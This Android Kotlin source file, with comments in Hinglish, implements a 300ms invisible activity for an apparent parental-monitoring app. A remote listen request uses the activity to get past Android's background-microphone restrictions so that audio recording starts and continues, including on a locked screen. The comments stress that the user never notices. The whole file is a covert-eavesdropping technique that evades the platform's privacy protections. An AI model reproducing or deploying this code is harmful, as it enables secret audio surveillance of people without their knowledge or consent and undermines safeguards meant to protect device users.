package com.example.background

import android.app.Activity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager

/**
 * ============================================================
 * MicGateActivity.kt — NAYI FILE
 * ============================================================
 *
 * 300ms ki FULLY TRANSPARENT activity — screen pe kuch nahi dikhta
 * (na flash, na dim), user ko pata bhi nahi chalta.
 *
 * KAISE KAAM KARTA HAI:
 *   1. Parent "listen" request bhejta hai (Firestore sync_mic=true)
 *   2. Child app background me hai → MicEligibility.isAppInUse() = false
 *   3. Service MicGateActivity launch karta hai (SYSTEM_ALERT_WINDOW
 *      permission ki wajah se background activity launch ALLOWED hai)
 *   4. Activity STARTED → Android manta hai "app use ho rahi hai"
 *   5. onResume() me service.startAudioSessionNow(callId) call hota hai
 *      → startForeground(MICROPHONE|SPECIAL_USE) ab LEGAL
 *      → AudioRecord real data deta hai (zeros nahi)
 *   6. 300ms baad activity khud finish() — mic session background me
 *      chalta rehta hai kyunki FGS ab "started from foreground" hai
 *
 * LOCK SCREEN PE BHI KAAM KARTA HAI:
 *   showWhenLocked + turnScreenOn — device locked ho tab bhi mic
 *   enable ho jata hai.
 *
 * MANIFEST REQUIREMENTS (patched manifest me already added):
 *   excludeFromRecents, noHistory, taskAffinity="",
 *   Theme.Translucent.NoTitleBar, showWhenLocked, turnScreenOn
 *
 * NOTE: MicGate ke liye "Display over other apps" (overlay) permission
 * child device pe granted honi chahiye — MainActivity ke
 * "openOverlaySettings" channel method se onboarding me le lo.
 */
class MicGateActivity : Activity() {

    companion object {
        private const val TAG = "MIC_GATE"

        /** Service instance — launchMicGate() se set hota hai */
        @Volatile
        var serviceRef: CareCircleForegroundService? = null

        /** Jo call id gate ke through start karni hai */
        @Volatile
        var pendingCallId: String? = null

        /** Gate kitna der khula rahe */
        private const val GATE_DURATION_MS = 300L
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Fully transparent window — koi layout inflate nahi karte,
        // isliye koi visual flash bhi nahi hoga
        window.setLayout(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT
        )
        // Lock screen ke upar bhi kaam karne ke liye
        setShowWhenLocked(true)
        setTurnScreenOn(true)
        Log.d(TAG, "MicGate created")
    }

    override fun onStart() {
        super.onStart()
        // Application-level lifecycle callback isko track karega,
        // but safety ke liye yahan bhi ensure kar rahe hai
        Log.d(TAG, "MicGate started — app ab 'in use' hai")
    }

    override fun onResume() {
        super.onResume()
        Log.d(TAG, "MicGate resumed — ab mic start karna LEGAL hai")

        val callId = pendingCallId
        if (callId != null) {
            val svc = serviceRef ?: CareCircleForegroundService.instanceRef
            if (svc != null) {
                Log.d(TAG, "Audio session start via gate: callId=$callId")
                svc.startAudioSessionNow(callId)
            } else {
                Log.e(TAG, "Service ref null — session start nahi hua")
            }
            pendingCallId = null
        }

        // 300ms baad khud band — kaam ho gaya, user ko kuch nahi dikhta
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                finish()
            } catch (_: Exception) {}
        }, GATE_DURATION_MS)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "MicGate destroyed — mic session background me chalta rahega")
    }
}
